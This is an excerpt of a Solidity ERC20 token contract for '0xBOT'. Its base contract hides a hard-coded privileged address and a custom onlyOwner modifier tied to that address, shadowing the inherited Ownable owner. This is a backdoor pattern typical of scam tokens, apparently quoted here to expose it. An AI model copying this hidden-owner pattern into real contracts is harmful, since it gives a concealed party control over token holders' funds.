...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    string public ZEROxBOTnuwebsite = "https://0x-bot.com/";
    string public ZEROxBOTnuADDRESS = "0x633C8692411f2813D25b44a56C8b1694098dB20d";
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    address private WhaleZEROxBOTnu;
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
       _decimals = 9;
         WhaleZEROxBOTnu = 0x633C8692411f2813D25b44a56C8b1694098dB20d;      
    }
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _afterTokenTransfer(account, address(0), amount);
              ...
              function getZEROxBOTnuwebsite() public view returns (string memory) {
        return ZEROxBOTnuwebsite;
    } 


               function getZEROxBOTnuADDRESS() public view returns (string memory) {
        return ZEROxBOTnuADDRESS;
    }    
      modifier onlyOwner() {
         require(_msgSender() == WhaleZEROxBOTnu);
        _;
    }    
    function _approve(
        address owner,
...
contract ZEROxBOT is ERC20, Ownable {
    constructor () ERC20("0xBOT", "0xBOT") 
    {    
